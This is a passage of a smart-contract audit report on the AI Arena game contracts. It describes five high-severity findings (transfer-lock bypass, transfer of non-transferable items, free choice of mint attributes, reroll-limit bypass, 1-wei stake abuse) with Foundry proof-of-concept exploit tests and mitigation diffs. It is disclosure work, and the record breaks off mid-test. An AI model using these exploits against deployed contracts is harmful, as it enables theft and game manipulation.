[H-01] A locked fighter can be transferred; leads to game server unable to commit transactions, and unstoppable fighters
Submitted byCodeWasp, also found byadam-idarrha,d3e4,vnavascues,c0pp3rscr3w3r,shaka,GhK3Ndf,alexxander,Fulum,thank_you,denzi_,Limbooo,korok,evmboi32,juancito,grearlake,ktg,radev_sw,rouhsamad,KmanOfficial,MidgarAudits,KupiaSec,0xaghas,Bauchibred,jaydhales,immeas,MrPotatoMagic,soliditywala,sashik_eth,0xLogos,Tendency,0x13,PedroZurdo,al88nsk, ladboy233 (1,2),merlinboii,DanielArmstrong,hulkvision,israeladelaja,Draiakoo,ADM,petro_1912,nuthan2x,0xCiphky,peanuts,cats,0xAsen,stackachu,deadrxsezzz,Krace,jnforja,0xvj,_eperezok,pkqs90,Josh4324,web3pwn,Aamir,btk, pynschon (1,2),0xE1,ubl4nk,fnanni,devblixt,cartlex_,erosjohn,BARW,dimulski,zhaojohnson,blutorque,Kalogerone,DMoore,jesjupyter,0xlemon,klau5,0xAlix2,alexzoid,novamanbg,sobieski,xchen1130,matejdb,tallo,Pelz,oualidpro,aslanbek, and0xlyov
FighterFarmcontract implements restrictions on the transferability of fighters in functionstransferFrom()andsafeTransferFrom(), via the call to function_ableToTransfer(). Unfortunately this approach doesn’t cover all possible ways to transfer a fighter:  TheFighterFarmcontract inherits from OpenZeppelin’sERC721contract, which includes the public functionsafeTransferFrom(…, data), i.e. the same assafeTransferFrom()but with the additionaldataparameter. This inherited function becomes available in theGameItemscontract, and calling it allows us to circumvent the transferability restriction. As a result, a player will be able to transfer any of their fighters, irrespective of whether they are locked or not. Violation of such a basic system invariant leads to various kinds of impacts, including:
The game server won’t be able to commit some transactions;The transferred fighter becomes unstoppable (a transaction in which it loses can’t be committed);The transferred fighter may be used as a “poison pill” to spoil another player, and prevent it from leaving the losing zone (a transaction in which it wins can’t be committed).
Both of the last two impacts include the inability of the game server to commit certain transactions, so we illustrate both of the last two with PoCs, thus illustrating the first one as well.
Impact 1: A fighter becomes unstoppable, game server unable to commit
If a fighter wins a battle,points are addedtoaccumulatedPointsPerAddress mapping. When a fighter loses a battle, the reverse happens:points are subtracted. If a fighter is transferred after it wins the battle to another address,accumulatedPointsPerAddressfor the new address is empty, and thus the points can’t be subtracted:the game server transaction will be reverted. By transferring the fighter to a new address after each battle,the fighter becomes unstoppable, as its accumulated points will only grow, and will never decrease.
Impact 2: Another fighter can’t win, game server unable to commit
If a fighter loses a battle, funds are transferred from the amount at stake, to the stake-at risk, which is reflected in theamountLost mappingofStakeAtRiskcontract. If the fighter with stake-at-risk is transferred to another player, the invariant thatamountLostreflects the lost amount per address is violated: after the transfer the second player has more stake-at-risk than before. A particular way to exploit this violation is demonstrated below: the transferred fighter may win a battle, which leads toreducing amountLostby the corresponding amount. Upon subsequent wins of the second player own fighters, this operation will underflow, leading tothe game server unable to commit transactions, andthe player unable to exit the losing zone. This effectively makes a fighter with the stake-at-risk a “poison pill”.
Proof of Concept
Impact 1: A fighter becomes unstoppable, game server unable to commit
diff --git a/test/RankedBattle.t.sol b/test/RankedBattle.t.solindex 6c5a1d7..dfaaad4 100644--- a/test/RankedBattle.t.sol+++ b/test/RankedBattle.t.sol@@ -465,6 +465,31 @@ contract RankedBattleTest is Test {assertEq(unclaimedNRN, 5000 * 10 ** 18);}+   /// @notice An exploit demonstrating that it's possible to transfer a staked fighter, and make it immortal!+    function testExploitTransferStakedFighterAndPlay() public {+        address player = vm.addr(3);+        address otherPlayer = vm.addr(4);+        _mintFromMergingPool(player);+        uint8 tokenId = 0;+        _fundUserWith4kNeuronByTreasury(player);+        vm.prank(player);+        _rankedBattleContract.stakeNRN(1 * 10 ** 18, tokenId);+        // The fighter wins one battle+        vm.prank(address(_GAME_SERVER_ADDRESS));+        _rankedBattleContract.updateBattleRecord(tokenId, 0, 0, 1500, true);+        // The player transfers the fighter to other player+        vm.prank(address(player));+        _fighterFarmContract.safeTransferFrom(player, otherPlayer, tokenId, "");+        assertEq(_fighterFarmContract.ownerOf(tokenId), otherPlayer);+        // The fighter can't lose+        vm.prank(address(_GAME_SERVER_ADDRESS));+        vm.expectRevert();+        _rankedBattleContract.updateBattleRecord(tokenId, 0, 2, 1500, true);+        // The fighter can only win: it's unstoppable!+        vm.prank(address(_GAME_SERVER_ADDRESS));+        _rankedBattleContract.updateBattleRecord(tokenId, 0, 0, 1500, true);+    }+/*//////////////////////////////////////////////////////////////HELPERS//////////////////////////////////////////////////////////////*/Place the PoC intotest/RankedBattle.t.sol, and execute withforge test --match-test testExploitTransferStakedFighterAndPlay
Impact 2: Another fighter can’t win, game server unable to commit
diff --git a/test/RankedBattle.t.sol b/test/RankedBattle.t.solindex 6c5a1d7..196e3a0 100644--- a/test/RankedBattle.t.sol+++ b/test/RankedBattle.t.sol@@ -465,6 +465,62 @@ contract RankedBattleTest is Test {assertEq(unclaimedNRN, 5000 * 10 ** 18);}+/// @notice Prepare two players and two fighters+function preparePlayersAndFighters() public returns (address, address, uint8, uint8) {+    address player1 = vm.addr(3);+    _mintFromMergingPool(player1);+    uint8 fighter1 = 0;+    _fundUserWith4kNeuronByTreasury(player1);+    address player2 = vm.addr(4);+    _mintFromMergingPool(player2);+    uint8 fighter2 = 1;+    _fundUserWith4kNeuronByTreasury(player2);+    return (player1, player2, fighter1, fighter2);+}++/// @notice An exploit demonstrating that it's possible to transfer a fighter with funds at stake+/// @notice After transferring the fighter, it wins the battle,+/// @notice and the second player can't exit from the stake-at-risk zone anymore.+function testExploitTransferStakeAtRiskFighterAndSpoilOtherPlayer() public {+    (address player1, address player2, uint8 fighter1, uint8 fighter2) =+        preparePlayersAndFighters();+    vm.prank(player1);+    _rankedBattleContract.stakeNRN(1_000 * 10 **18, fighter1);+    vm.prank(player2);+    _rankedBattleContract.stakeNRN(1_000 * 10 **18, fighter2);+    // Fighter1 loses a battle+    vm.prank(address(_GAME_SERVER_ADDRESS));+    _rankedBattleContract.updateBattleRecord(fighter1, 0, 2, 1500, true);+    assertEq(_rankedBattleContract.amountStaked(fighter1), 999 * 10 ** 18);+    // Fighter2 loses a battle+    vm.prank(address(_GAME_SERVER_ADDRESS));+    _rankedBattleContract.updateBattleRecord(fighter2, 0, 2, 1500, true);+    assertEq(_rankedBattleContract.amountStaked(fighter2), 999 * 10 ** 18);++    // On the game server, player1 initiates a battle with fighter1,+    // then unstakes all remaining stake from fighter1, and transfers it+    vm.prank(address(player1));+    _rankedBattleContract.unstakeNRN(999 * 10 ** 18, fighter1);+    vm.prank(address(player1));+    _fighterFarmContract.safeTransferFrom(player1, player2, fighter1, "");+    assertEq(_fighterFarmContract.ownerOf(fighter1), player2);+    // Fighter1 wins a battle, and part of its stake-at-risk is derisked.+    vm.prank(address(_GAME_SERVER_ADDRESS));+    _rankedBattleContract.updateBattleRecord(fighter1, 0, 0, 1500, true);+    assertEq(_rankedBattleContract.amountStaked(fighter1), 1 * 10 ** 15);+    // Fighter2 wins a battle, but the records can't be updated, due to underflow!+    vm.expectRevert();+    vm.prank(address(_GAME_SERVER_ADDRESS));+    _rankedBattleContract.updateBattleRecord(fighter2, 0, 0, 1500, true);+    // Fighter2 can't ever exit from the losing zone in this round, but can lose battles+    vm.prank(address(_GAME_SERVER_ADDRESS));+    _rankedBattleContract.updateBattleRecord(fighter2, 0, 2, 1500, true);+    (uint32 wins, uint32 ties, uint32 losses) = _rankedBattleContract.getBattleRecord(fighter2);+    assertEq(wins, 0);+    assertEq(ties, 0);+    assertEq(losses, 2);+}+/*//////////////////////////////////////////////////////////////HELPERS//////////////////////////////////////////////////////////////*/Place the PoC intotest/RankedBattle.t.sol, and execute withforge test --match-test testExploitTransferStakeAtRiskFighterAndSpoilOtherPlayer
Recommended Mitigation Steps
Remove the incomplete checks in the inherited functionstransferFrom()andsafeTransferFrom()ofFighterFarmcontract, and instead to enforce the transferability restriction via the_beforeTokenTransfer()hook, which applies equally to all token transfers, as illustrated below.
diff --git a/src/FighterFarm.sol b/src/FighterFarm.solindex 06ee3e6..9f9ac54 100644--- a/src/FighterFarm.sol+++ b/src/FighterFarm.sol@@ -330,40 +330,6 @@ contract FighterFarm is ERC721, ERC721Enumerable {);}-    /// @notice Transfer NFT ownership from one address to another.-    /// @dev Add a custom check for an ability to transfer the fighter.-    /// @param from Address of the current owner.-    /// @param to Address of the new owner.-    /// @param tokenId ID of the fighter being transferred.-    function transferFrom(-        address from,-        address to,-        uint256 tokenId-    )-        public-        override(ERC721, IERC721)-    {-        require(_ableToTransfer(tokenId, to));-        _transfer(from, to, tokenId);-    }--    /// @notice Safely transfers an NFT from one address to another.-    /// @dev Add a custom check for an ability to transfer the fighter.-    /// @param from Address of the current owner.-    /// @param to Address of the new owner.-    /// @param tokenId ID of the fighter being transferred.-    function safeTransferFrom(-        address from,-        address to,-        uint256 tokenId-    )-        public-        override(ERC721, IERC721)-    {-        require(_ableToTransfer(tokenId, to));-        _safeTransfer(from, to, tokenId, "");-    }-/// @notice Rolls a new fighter with random traits./// @param tokenId ID of the fighter being re-rolled./// @param fighterType The fighter type.@@ -448,7 +414,9 @@ contract FighterFarm is ERC721, ERC721Enumerable {internaloverride(ERC721, ERC721Enumerable){-        super._beforeTokenTransfer(from, to, tokenId);+        if(from != address(0) && to != address(0))+            require(_ableToTransfer(tokenId, to));+        super._beforeTokenTransfer(from, to , tokenId);}/*//////////////////////////////////////////////////////////////
brandinho (AI Arena) confirmed
AI Arena mitigated:
Fixed safeTransferFrom override with data.https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/2
Status:Mitigation confirmed. Full details in reports fromniser93,d3e4, andfnanni.

[H-02] Non-transferableGameItemscan be transferred withGameItems::safeBatchTransferFrom(...)
Submitted byAamir, also found bym4ttm,vnavascues,visualbits,Fulum,peter,GhK3Ndf,shaka,sandy,alexxander,thank_you,evmboi32,0xprinc,Limbooo,denzi_,grearlake,Greed,korok,josephdara,juancito,ZanyBonzy,Breeje,hulkvision,KmanOfficial,CodeWasp,DeFiHackLabs,0xaghas,MidgarAudits,Ryonen,alexzoid,n0kto,immeas,Aymen0909,jaydhales,sashik_eth,soliditywala,0xLogos,0x13,Tendency,0xpoor4ever,PedroZurdo,merlinboii,ni8mare,BARW,israeladelaja,0xlyov,Draiakoo,petro_1912,ADM,Krace,0x11singh99,McToady,ktg,0xCiphky,MrPotatoMagic,0xWallSecurity,cats,nuthan2x,ladboy233,0xAsen,stackachu,deadrxsezzz,0xvj,_eperezok,pkqs90,Josh4324,web3pwn,jnforja,Jorgect,SovaSlava,btk,pynschon,blutorque,lil_eth,0xE1,fnanni,Bauchibred,devblixt,tpiliposian,erosjohn,Pelz,ubl4nk,cartlex_,krikolkk,Kalogerone,kutugu,zhaojohnson,shaflow2,pa6kuda,djxploit,solmaxis69,0rpse,0xlemon,0xKowalski,SpicyMeatball,novamanbg,DMoore,jesjupyter,csanuragjain,0xBinChook,matejdb,tallo,aslanbek,0xAlix2,sobieski,kiqo,dimulski,xchen1130,0xbranded,oualidpro,Timenov,haxatron,klau5, andal88nsk
TheGamesItemscontract fails to appropriately override and include essential checks within thesafeBatchTransferFromfunction, enabling the transfer of non-transferrable Game Items.
Impact
While theGamesItemscontract allows for the designation of Game Items as either transferrable or non-transferrable through different states and overrides theERC1155::safeTransferFrom(...)function accordingly, it neglects to override theERC1155::safeBatchTransferFrom(...)function. This oversight permits users to transfer Game Items that were intended to be non-transferrable.
Proof of Concept
Here is a test for PoC:
NOTE: Include the below given test inGameItems.t.sol.
functiontestNonTransferableItemCanBeTransferredWithBatchTransfer()public{// funding owner address with 4k $NRN_fundUserWith4kNeuronByTreasury(_ownerAddress);// owner minting itme_gameItemsContract.mint(0,1);// checking that the item is minted correctlyassertEq(_gameItemsContract.balanceOf(_ownerAddress,0),1);// making the item non-transferable_gameItemsContract.adjustTransferability(0,false);vm.expectRevert();// trying to transfer the non-transferable item. Should revert_gameItemsContract.safeTransferFrom(_ownerAddress,_DELEGATED_ADDRESS,0,1,"");// checking that the item is still in the owner's accountassertEq(_gameItemsContract.balanceOf(_DELEGATED_ADDRESS,0),0);assertEq(_gameItemsContract.balanceOf(_ownerAddress,0),1);// transferring the item using safeBatchTransferFromuint256[]memoryids=newuint256[](1);ids[0] =0;uint256[]memoryamounts=newuint256[](1);amounts[0] =1;_gameItemsContract.safeBatchTransferFrom(_ownerAddress,_DELEGATED_ADDRESS,ids,amounts,"");// checking that the item is transferred to the delegated addressassertEq(_gameItemsContract.balanceOf(_DELEGATED_ADDRESS,0),1);assertEq(_gameItemsContract.balanceOf(_ownerAddress,0),0);}
Output:
┌──(aamirusmani1552㉿Victus)-[/mnt/d/ai-arena-audit]└─$ forgetest--mt testNonTransferableItemCanBeTransferredWithBatchTransfer[⠒] Compiling...[⠃] Compiling 1 files with 0.8.13[⠒] Solc 0.8.13 finishedin1.77sCompiler run successful!Running 1testfortest/GameItems.t.sol:GameItemsTest[PASS]testNonTransferableItemCanBeTransferredWithBatchTransfer() (gas: 190756)Test result: ok. 1 passed; 0 failed; 0 skipped; finishedin1.32msRan 1testsuites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
Tools Used
Foundry
Recommended Mitigation Steps
It is recommended to override thesafeBatchTransferFrom(...)function and include the necessary checks to prevent the transfer of non-transferrable Game Items.
+    function safeBatchTransferFrom(+        address from,+        address to,+        uint256[] memory ids,+        uint256[] memory amounts,+        bytes memory data+    ) public override(ERC1155) {+        for(uint256 i; i < ids.length; i++{+            require(allGameItemAttributes[ids[i]].transferable);+        }+        super.safeBatchTransferFrom(from, to, ids, amounts, data);+    }
Or, consider overriding the_safeBatchTransferFrom(...)function as follows:
+    function _safeBatchTransferFrom(+        address from,+        address to,+        uint256[] memory ids,+        uint256[] memory amounts,+        bytes memory data+    ) internal override(1155) {+        require(ids.length == amounts.length, "ERC1155: ids and amounts length mismatch");+        require(to != address(0), "ERC1155: transfer to the zero address");++        address operator = _msgSender();++        _beforeTokenTransfer(operator, from, to, ids, amounts, data);++        for (uint256 i = 0; i < ids.length; ++i) {+            require(+            uint256 id = ids[i];+            uint256 amount = amounts[i];+           require(allGameItemAttributes[id].transferable);+            uint256 fromBalance = _balances[id][from];+            require(fromBalance >= amount, "ERC1155: insufficient balance for transfer");+            unchecked {+                _balances[id][from] = fromBalance - amount;+            }+            _balances[id][to] += amount;+        }++        emit TransferBatch(operator, from, to, ids, amounts);++        _afterTokenTransfer(operator, from, to, ids, amounts, data);++        _doSafeBatchTransferAcceptanceCheck(operator, from, to, ids, amounts, data);+    }
brandinho (AI Arena) confirmed
hickuphh3 (judge) increased severity to High
AI Arena mitigated:
Fixed Non-transferableGameItemsbeing transferred withGameItems::safeBatchTransferFrom.https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/4
Status:Mitigation confirmed. Full details in reports fromniser93,d3e4, andfnanni.

[H-03] Players have complete freedom to customize the fighter NFT when callingredeemMintPassand can redeem fighters of types Dendroid and with rare attributes
Submitted byAbdessamed, also found by juancito (1,2),vnavascues,d3e4,DarkTower,shaka,alexxander,0xmystery, evmboi32 (1,2,3),soliditywala,givn,korok,dimulski,denzi_,VAD37,sl1,OMEN,stakog,ahmedaghadi,Ryonen,FloatingPragma, n0kto (1,2),adamn000,0rpse,bhilare_,0xAsen,Tendency,ke1caM, Draiakoo (1,2),Archime,ADM,McToady,MrPotatoMagic, 0xCiphky (1,2),VrONTg,Velislav4o, btk (1,2),stackachu,zhaojohnson, 0xvj (1,2),pkqs90,devblixt,niser93,cats,peter, BARW (1,2,3),Aamir,jesjupyter,fnanni,alexzoid,krikolkk,t0x1c,yotov721,klau5,0xlemon,radin100,0xAlix2,SpicyMeatball,matejdb,haxatron,JCN,immeas,PetarTolev, andZac
The functionredeemMintPassallows burning multiple mint passes in exchange for fighters’ NFTs. It is mentioned by the sponsor that the player should not have a choice of customizing the fighters’ properties and their type. However, nothing prevents a player from:
Providinguint8[] fighterTypesof values1to mint fighters of typesDendroid.Checking previous transactions in which thednaprovidedled to minting fighters with rare physical attributes, copying those Dnas and passing them to theredeemMinPassto mint fighters with low rarity attributes. That is because creating physical attributes isdeterministic, so providing the same inputs leads to generating a fighter with the same attributes.
Impact
This issue has two major impacts:
Players with valid mint passes can mint fighters of type Dendroid easily.Players with valid mint passes can mint easily fighters with low rarity attributes which breaks the pseudo-randomness attributes generation aspect
Proof of Concept
For someone having valid mint passes, he calls the functionredeemMintPassprovidingfighterTypesarrayof values1. For each mint pass, the inner function_createNewFighterwill be called passing the value1asfighterTypeargument which corresponds toDendroid, a new fighter of typedendroidwill be minted for the caller.
functiontest_redeeming_dendroid_fighters_easily()public{uint8[2]memorynumToMint= [1,0];bytesmemorysignature=abi.encodePacked(hex"20d5c3e5c6b1457ee95bb5ba0cbf35d70789bad27d94902c67ec738d18f665d84e316edf9b23c154054c7824bba508230449ee98970d7c8b25cc07f3918369481c");string[]memory_tokenURIs=newstring[](1);_tokenURIs[0] ="ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";// first i have to mint an nft from the mintpass contractassertEq(_mintPassContract.mintingPaused(),false);_mintPassContract.claimMintPass(numToMint,signature,_tokenURIs);assertEq(_mintPassContract.balanceOf(_ownerAddress),1);assertEq(_mintPassContract.ownerOf(1),_ownerAddress);// once owning one i can then redeem it for a fighteruint256[]memory_mintpassIdsToBurn=newuint256[](1);string[]memory_mintPassDNAs=newstring[](1);uint8[]memory_fighterTypes=newuint8[](1);uint8[]memory_iconsTypes=newuint8[](1);string[]memory_neuralNetHashes=newstring[](1);string[]memory_modelTypes=newstring[](1);_mintpassIdsToBurn[0] =1;_mintPassDNAs[0] ="dna";_fighterTypes[0] =1;// @audit Notice that I can provide value 1 which corresponds to Dendroid type_neuralNetHashes[0] ="neuralnethash";_modelTypes[0] ="original";_iconsTypes[0] =1;// approve the fighterfarm contract to burn the mintpass_mintPassContract.approve(address(_fighterFarmContract),1);_fighterFarmContract.redeemMintPass(_mintpassIdsToBurn,_fighterTypes,_iconsTypes,_mintPassDNAs,_neuralNetHashes,_modelTypes);// check balance to see if we successfully redeemed the mintpass for a fighterassertEq(_fighterFarmContract.balanceOf(_ownerAddress),1);}
Ran 1testfortest/FighterFarm.t.sol:FighterFarmTest[PASS]test_redeeming_dendroid_fighters_easily() (gas: 578678)Test result: ok. 1 passed; 0 failed; 0 skipped; finishedin6.56msRan 1testsuite: 1 tests passed, 0 failed, 0 skipped (1 total tests)
The player can also inspect previous transactions that minted a fighter with rare attributes, copy the providedmintPassDnasand provide them asargument in theredeemMintPass. The_createNewFighterfunctioncallsAiArenaHelperto create the physical attributes for the fighter. The probability of attributes isdeterministicand since the player provideddnathat already led to a fighter with rare attributes, his fighter will also have rare attributes.
Recommended Mitigation Steps
The main issue is that the mint pass token is not tied to the fighter properties that the player should claim and the player has complete freedom of the inputs. Consider implementing a signature mechanism that prevents the player from changing the fighter’s properties like implemented inclaimFighters
brandinho (AI Arena) confirmed
AI Arena mitigated:
https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/10
Status:Mitigation confirmed. Full details in reports fromniser93andfnanni.

[H-04] Since you can reroll with a different fighterType than the NFT you own, you can reroll bypassing maxRerollsAllowed and reroll attributes based on a different fighterType
Submitted byklau5, also found byMcToady, Tychai0s (1,2),vnavascues,d3e4,shaka,alexxander,grearlake,AlexCzm,lanrebayode77,evmboi32,givn,juancito,VAD37,Varun_05,DanielArmstrong,linmiaomiao,14si2o_Flint,Ryonen,n0kto,alexzoid,ktg,denzi_,Aymen0909,Davide,soliditywala,Aamir,sashik_eth,sl1,nuthan2x,0xAsen,merlinboii,ke1caM,Draiakoo,petro_1912,MrPotatoMagic,PoeAudits,0xCiphky,aslanbek,0xvj, cats (1,2),yotov721,btk,pynschon,solmaxis69,fnanni,0xAlix2,0xKowalski,blutorque,t0x1c,ubl4nk,BARW,radin100,Giorgio,zhaojohnson,0xlemon,jesjupyter,SpicyMeatball,novamanbg,xchen1130,matejdb,haxatron,0xAleko,Blank_Space, andSilvermist
Can reroll attributes based on a different fighterType, and can bypass maxRerollsAllowed.
Proof of Concept
maxRerollsAllowedcan be set differently depending on thefighterType. Precisely, it increases as the generation of fighterType increases.
functionincrementGeneration(uint8fighterType)externalreturns(uint8) {require(msg.sender==_ownerAddress);@>generation[fighterType] +=1;@>maxRerollsAllowed[fighterType] +=1;returngeneration[fighterType];}
ThereRollfunction does not verify if thefighterTypegiven as a parameter is actually thefighterTypeof the given tokenId. Therefore, it can use either 0 or 1 regardless of the actual type of the NFT.
This allows bypassingmaxRerollsAllowedfor additional reRoll, and to call_createFighterBaseandcreatePhysicalAttributesbased on a differentfighterTypethan the actual NFT’sfighterType, resulting in attributes calculated based on different criteria.
functionreRoll(uint8tokenId,uint8fighterType)public{require(msg.sender==ownerOf(tokenId));@>require(numRerolls[tokenId] <maxRerollsAllowed[fighterType]);require(_neuronInstance.balanceOf(msg.sender) >=rerollCost,"Not enough NRN for reroll");_neuronInstance.approveSpender(msg.sender,rerollCost);boolsuccess=_neuronInstance.transferFrom(msg.sender,treasuryAddress,rerollCost);if(success) {numRerolls[tokenId] +=1;uint256dna=uint256(keccak256(abi.encode(msg.sender,tokenId,numRerolls[tokenId])));@>      (uint256element,uint256weight,uint256newDna) =_createFighterBase(dna,fighterType);fighters[tokenId].element=element;fighters[tokenId].weight=weight;fighters[tokenId].physicalAttributes=_aiArenaHelperInstance.createPhysicalAttributes(newDna,@>generation[fighterType],fighters[tokenId].iconsType,fighters[tokenId].dendroidBool);_tokenURIs[tokenId] ="";}}
PoC:
First, there is a bug that there is no way to setnumElements, so add a numElements setter to FighterFarm. This bug has been submitted as a separate report.functionnumElementsSetterForPoC(uint8_generation,uint8_newElementNum)public{require(msg.sender==_ownerAddress);require(_newElementNum>0);numElements[_generation] =_newElementNum;}Add a test to the FighterFarm.t.sol file and run it. The generation of Dendroid has increased, andmaxRerollsAllowedhas increased. The user who owns the Champion NFT bypassedmaxRerollsAllowedby putting thefighterTypeof Dendroid as a parameter in thereRollfunction.functiontestPoCRerollBypassMaxRerollsAllowed()public{_mintFromMergingPool(_ownerAddress);// get 4k neuron from treasury_fundUserWith4kNeuronByTreasury(_ownerAddress);// after successfully minting a fighter, update the modelif(_fighterFarmContract.ownerOf(0) ==_ownerAddress) {uint8maxRerolls=_fighterFarmContract.maxRerollsAllowed(0);uint8exceededLimit=maxRerolls+1;uint8tokenId=0;uint8fighterType=0;// The Dendroid's generation changed, and maxRerollsAllowed for Dendroid is increaseduint8fighterType_Dendroid=1;_fighterFarmContract.incrementGeneration(fighterType_Dendroid);assertEq(_fighterFarmContract.maxRerollsAllowed(fighterType_Dendroid),maxRerolls+1);assertEq(_fighterFarmContract.maxRerollsAllowed(fighterType),maxRerolls);// Champions maxRerollsAllowed is not changed_neuronContract.addSpender(address(_fighterFarmContract));_fighterFarmContract.numElementsSetterForPoC(1,3);// this is added function for pocfor(uint8i=0;i<exceededLimit;i++) {if(i== (maxRerolls)) {// reRoll with different fighterTypeassertEq(_fighterFarmContract.numRerolls(tokenId),maxRerolls);_fighterFarmContract.reRoll(tokenId,fighterType_Dendroid);assertEq(_fighterFarmContract.numRerolls(tokenId),exceededLimit);}else{_fighterFarmContract.reRoll(tokenId,fighterType);}}}}
Recommended Mitigation Steps
CheckfighterTypeat reRoll function.
function reRoll(uint8 tokenId, uint8 fighterType) public {require(msg.sender == ownerOf(tokenId));require(numRerolls[tokenId] < maxRerollsAllowed[fighterType]);require(_neuronInstance.balanceOf(msg.sender) >= rerollCost, "Not enough NRN for reroll");+   require((fighterType == 1 && fighters[tokenId].dendroidBool) || (fighterType == 0 && !fighters[tokenId].dendroidBool), "Wrong fighterType");_neuronInstance.approveSpender(msg.sender, rerollCost);bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, rerollCost);if (success) {numRerolls[tokenId] += 1;uint256 dna = uint256(keccak256(abi.encode(msg.sender, tokenId, numRerolls[tokenId])));(uint256 element, uint256 weight, uint256 newDna) = _createFighterBase(dna, fighterType);fighters[tokenId].element = element;fighters[tokenId].weight = weight;fighters[tokenId].physicalAttributes = _aiArenaHelperInstance.createPhysicalAttributes(newDna,generation[fighterType],fighters[tokenId].iconsType,fighters[tokenId].dendroidBool);_tokenURIs[tokenId] = "";}}
raymondfam (lookout) commented:
This report covers three consequences from the same root cause of fighter type validation: 1. more re-rolls, 2. rarer attribute switch, 3. generation attribute switch, with coded POC.
brandinho (AI Arena) confirmed
hickuphh3 (judge) increased severity to High and commented:
Note:issue 212’s fix is a little more elegant.
AI Arena mitigated:
https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/17
Status:Mitigation confirmed. Full details in reports fromniser93,d3e4, andfnanni.

[H-05] Malicious user can stake an amount which causes zero curStakeAtRisk on a loss but equal rewardPoints to a fair user on a win
Submitted byt0x1c, also found byAamir, peanuts (1,2),YouCrossTheLineAlfie,ubermensch,d3e4,shaka,alexxander,CodeWasp,0xDetermination,evmboi32,Honour,DarkTower,ni8mare,Blank_Space, McToady (1,2),neocrao,PedroZurdo,ZanyBonzy,VAD37,DanielArmstrong, 14si2o_Flint (1,2),forkforkdog,MidgarAudits,n0kto,Krace,MrPotatoMagic,0xAadi,0xBinChook,immeas, btk (1,2),forgebyola,aslanbek, Draiakoo (1,2),petro_1912,ktg,israeladelaja,0xCiphky,Merulez99,swizz,0rpse,Silvermist, ubl4nk (1,2),dimulski, erosjohn (1,2),fnanni,yotov721,Abdessamed,djxploit, csanuragjain (1,2),Kalogerone,shaflow2,WoolCentaur,Tychai0s,handsomegiraffe,AC000123, VrONTg (1,2,3),okolicodes,Velislav4o, andjuancito
The_getStakingFactor()function rounds-up thestakingFactor_to one if its zero. Additionally, the_addResultPoints()function rounds-down thecurStakeAtRisk.Whenever a player loses and has no accumulated reward points, 0.1% of his staked amount is considered “at risk” and transferred to the_stakeAtRiskAddress. However due to the above calculation styles, he can stake just1 weiof NRN to have zerocurStakeAtRiskin case of a loss and in case of a win, still gain the same amount of reward points as a player staking4e18-1wei of NRN.
Let’s look at three cases of a player with ELO as 1500:
CaseStaked NRNstakingFactor calculated by the protocolReward Points accumulated in case of a WINNRNs lost (stake at risk) in case of a LOSS14215000.00423.99999999999999999917500.00399999999999999930.00000000000000000117500
As can be seen in Case2 vs Case3, a player staking0.000000000000000001 NRN(1 wei) has the same upside in case of a win as a player staking3.999999999999999999 NRN(4e18-1 wei) while their downside is0.
Proof of Concept
Add the following test insidetest/RankedBattle.t.soland run viaforge test -vv --mt test_t0x1c_UpdateBattleRecord_SmallStaketo see the ouput under the 3 different cases:
functiontest_t0x1c_UpdateBattleRecord_SmallStake()public{addressplayer=vm.addr(3);_mintFromMergingPool(player);uint8tokenId=0;_fundUserWith4kNeuronByTreasury(player);// snapshot the current stateuint256snapshot0=vm.snapshot();vm.prank(player);_rankedBattleContract.stakeNRN(4e18,0);console.log("\n\n==================================== CASE 1 ==========================================================");emitlog_named_decimal_uint("Stats when staked amount =",4e18,18);// snapshot the current stateuint256snapshot0_1=vm.snapshot();vm.prank(address(_GAME_SERVER_ADDRESS));_rankedBattleContract.updateBattleRecord(0,50,0,1500,true);// if player had won(uint256wins,,) =_rankedBattleContract.fighterBattleRecord(tokenId);assertEq(wins,1);console.log("\n----------------------------------  IF WON  ---------------------------------------------------");console.log("accumulatedPointsPerFighter =:",_rankedBattleContract.accumulatedPointsPerFighter(0,0));emitlog_named_decimal_uint("getStakeAtRisk =",_stakeAtRiskContract.getStakeAtRisk(tokenId),18);emitlog_named_decimal_uint("_rankedBattleContract NRN balance =",_neuronContract.balanceOf(address(_rankedBattleContract)),18);emitlog_named_decimal_uint("_stakeAtRiskContract NRN balance =",_neuronContract.balanceOf(address(_stakeAtRiskContract)),18);// Restore to snapshot statevm.revertTo(snapshot0_1);vm.prank(address(_GAME_SERVER_ADDRESS));_rankedBattleContract.updateBattleRecord(0,50,2,1500,true);// if player had lost(,,uint256losses) =_rankedBattleContract.fighterBattleRecord(tokenId);assertEq(losses,1);console.log("\n----------------------------------  IF LOST  ---------------------------------------------------");console.log("accumulatedPointsPerFighter =",_rankedBattleContract.accumulatedPointsPerFighter(0,0));emitlog_named_decimal_uint("getStakeAtRisk =",_stakeAtRiskContract.getStakeAtRisk(tokenId),18);emitlog_named_decimal_uint("_rankedBattleContract NRN balance =",_neuronContract.balanceOf(address(_rankedBattleContract)),18);emitlog_named_decimal_uint("_stakeAtRiskContract NRN balance =",_neuronContract.balanceOf(address(_stakeAtRiskContract)),18);// Restore to snapshot statevm.revertTo(snapshot0);vm.prank(player);_rankedBattleContract.stakeNRN(4e18-1,0);console.log("\n\n==================================== CASE 2 ==========================================================");emitlog_named_decimal_uint("Stats when staked amount =",4e18-1,18);// snapshot the current stateuint256snapshot1_1=vm.snapshot();vm.prank(address(_GAME_SERVER_ADDRESS));_rankedBattleContract.updateBattleRecord(0,50,0,1500,true);// if player had won(wins,,) =_rankedBattleContract.fighterBattleRecord(tokenId);assertEq(wins,1);console.log("\n----------------------------------  IF WON  ---------------------------------------------------");console.log("accumulatedPointsPerFighter =:",_rankedBattleContract.accumulatedPointsPerFighter(0,0));emitlog_named_decimal_uint("getStakeAtRisk =",_stakeAtRiskContract.getStakeAtRisk(tokenId),18);emitlog_named_decimal_uint("_rankedBattleContract NRN balance =",_neuronContract.balanceOf(address(_rankedBattleContract)),18);emitlog_named_decimal_uint("_stakeAtRiskContract NRN balance =",_neuronContract.balanceOf(address(_stakeAtRiskContract)),18);// Restore to snapshot statevm.revertTo(snapshot1_1);vm.prank(address(_GAME_SERVER_ADDRESS));_rankedBattleContract.updateBattleRecord(0,50,2,1500,true);// if player had lost(,,losses) 